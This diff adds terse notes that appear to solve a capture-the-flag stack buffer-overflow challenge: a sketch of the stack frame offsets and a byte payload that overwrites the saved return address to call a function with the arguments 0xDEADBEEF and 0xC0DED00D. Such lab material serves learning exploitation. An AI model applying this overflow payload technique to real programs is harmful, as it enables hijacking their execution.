@@ -1,0 +1,26 @@
+vuln:
+
+
+
+esp->
+^
+|
+|
+-0xc
+|
++ebp-xb8
+|
+v
+^
+|
+-0xb4
+|
+v
+ebx
+ebp->ebp
+eip
+
+0xDEADBEEF
+0xC0DED00D
+
+payload = 'A' * (0xb8 + 4) + '\xe6\x85\x04\x08BBBB\xef\xbe\xad\xde\x0d\xd0\xde\xc0'
